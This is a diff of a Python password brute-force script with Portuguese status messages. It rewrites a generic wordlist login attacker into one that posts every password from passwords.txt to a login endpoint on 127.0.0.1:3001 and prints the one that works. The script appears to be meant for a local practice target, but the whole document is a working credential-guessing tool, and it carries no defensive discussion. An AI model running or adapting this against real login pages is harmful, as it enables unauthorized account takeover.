@@ -2,23 +2,44 @@ import requests
 import sys
 import time
 
-url = input("Enter the URL: ")
+url = "http://127.0.0.1:3001/api/login"
 username = input("Enter the username: ")
-password_file = input("Enter the password file: ")
-login_failed_string = input("Enter the login failed string: ")
+error = input("Enter the login failed string: ")
 
-with open(password_file, "r") as passwords:
-    for line in passwords:
-        http = requests.post(url, data={
-            username: username,
-            password: line.strip()
-        })
-        if login_failed_string in http.text:
-            print("[-] Password is incorrect: " + line.strip())
-        else:
-            # Print the password
-            print("[+] Password is correct: " + line.strip())
-            sys.exit(0)
-        time.sleep(1)
+z = """
+    [*]-------------------------[*]
+        Verificando servidor...
+    [*]-------------------------[*]
+"""
 
-print("Password not found")
+for c in z:
+    sys.stdout.write(c)
+    sys.stdout.flush()
+    time.sleep(0.01)
+
+try:
+    def brute(username, url, error):
+        count = 0
+        for password in passwords:
+            count += 1
+            password = password.strip()
+            print("\033[1;31m"+"[+] tentativa número [" + str(count) + "] a senha: " + password)
+            data_dict = {"user": username, "password": password}
+            
+            try:
+                res = requests.post(url, data=data_dict)
+
+                if error in res.content.decode():
+                    pass
+                else:
+                    print("\033[1;32m"+"[+] senha encontrada --> " + password)
+                    exit()
+
+            except requests.exceptions.ConnectionError:
+                print("\033[1;31m"+"[-] erro na conexão com o servidor")
+                exit()
+
+except:
+    print("\033[1;31m"+"[-] erro na conexão com o servidor")
+with open("passwords.txt", "r") as passwords:
+    brute(username, url, error)
